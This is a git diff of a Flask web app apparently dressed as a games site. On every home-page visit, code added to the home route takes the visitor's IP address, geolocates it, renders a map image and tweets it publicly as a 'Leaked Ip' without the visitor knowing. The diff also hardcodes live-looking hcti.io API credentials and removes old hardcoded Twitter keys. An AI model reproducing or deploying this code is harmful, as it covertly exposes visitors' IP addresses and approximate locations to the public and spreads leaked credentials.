@@ -1,22 +1,31 @@
 from flask import Flask, render_template, request, redirect
 import tweepy
 import random
+import requests
+import folium
+import os
+import json
 app = Flask(__name__)
 # Keys/Tokens for twitter bot
-# Please dont steal them
-consumer_key = "QVmwNTrTO2mlys63Z2bzdErT6"
-consumer_secret = "koO1uBGthtbKDt02W4JLTPRbQwrvbn0tSywt3C17FaxSeDdps1"
-access_token = "1524861877196668942-n9t3jyblMmPjiRujsk6hDa0ET7dmod"
-access_token_secret = "RIppr3bIrJVHufwiuHLXrcNptUAm2TIwiJ6mdEzly6KBN"
+consumer_key = os.getenv('consumer_key')
+consumer_secret = os.getenv('consumer_secret')
+access_token = os.getenv('access_token')
+access_token_secret = os.getenv('access_token_secret')
 #authenitcation for twitter bot
 auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
 auth.set_access_token(access_token, access_token_secret)
 api = tweepy.API(auth)
 
-gamelist = ["tetris", "snake", "trivia", "soccer penalties", "pacman", "fox and hounds", "mars lander", "maze", "solitare", "maze room", "missionaries and cannibals", "virus"]
+gamelist = ["tetris", "snake", "trivia", "soccer penalties", "pacman", "fox and hounds", "mars lander", "maze", "solitare", "maze room", "missionaries and cannibals", "virus","Chose-own-adventure"]
 number = 0
 @app.route('/')
 def home():
+  with open( "counter.txt", "r" ) as f:
+    count = f.read()
+
+  count = int(count)
+  with open( "counter.txt", "w" ) as f:
+    f.write( str(count+1) )
   # this gets the ip from the user. 
   ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
   #appends ip to text doccument
@@ -25,10 +34,70 @@ def home():
   ip.close()
   ip_addr = str(ip_addr)
   print(ip_addr)
+    
+
+  ip_address = ip_addr
+  # Replace with the IP address you want to plot
+  url = f'https://ipapi.co/{ip_addr}/json/'
+  response = requests.get(url)
+  
+  
+  data = response.json()
+
+  lat = data.get('latitude')
+  lon = data.get('longitude')
+  print(lat)
+  print(lon)
+  lat = float(lat)
+  lon = float(lon)  
+  # Create a Folium map centered on the IP address location
+  ma = folium.Map(location=[lat, lon], zoom_start=6)
+  
+  # Add a marker for the IP address location
+  folium.Marker(location=[lat, lon], popup=ip_address).add_to(ma)
+  
+  # Save the map as an HTML file
+  ma.save("map.html")
+  
+  
+  HCTI_API_ENDPOINT = "https://hcti.io/v1/image"
+  HCTI_API_USER_ID = '87634cfb-4da8-4e9c-9529-ce8277a5de82'
+  HCTI_API_KEY = '5d43bb55-1231-4437-99e8-2872912043cc'
+  
+  with open("map.html", "r") as f:
+      html_code = f.read()
+  
+  data = { 'html': html_code,
+           'css': ".box { color: white; background-color: #0f79b9; padding: 10px; font-family: Roboto }",
+           'google_fonts': "Roboto" }
+  
+  image = requests.post(url=HCTI_API_ENDPOINT, data=data, auth=(HCTI_API_USER_ID, HCTI_API_KEY))
+  
+  image_url = image.json()['url']
+  
+  # Download the image and save it as a binary file
+  response = requests.get(image_url)
+  with open("image.png", "wb") as f:
+      f.write(response.content)
+  
+  print("Image saved as image.png")
   # posts ip on twitter. The lucky number thing is to avoid duplicate messages which crashes the bot
-  api.update_status(ip_addr + " todays lucky number is " + str(random.randint(0,1000)))
+  tweet_text = "Leaked Ip: " + ip_addr + " Ip Number: "+ str(count)
+  image_path = "image.png"
+  media = api.media_upload(image_path)
+  api.update_status(status=tweet_text, media_ids=[media.media_id])
   return render_template( "index.html", ip_addr = ip_addr)
   
+@app.route('/adventure')
+def adventure_display():
+  return render_template(
+    "adventure.html",
+  )
+@app.route('/zion')
+def zion():
+  return render_template(
+    "zion.html",
+  )
 @app.route('/factors')
 def factors_display():
 	return render_template(
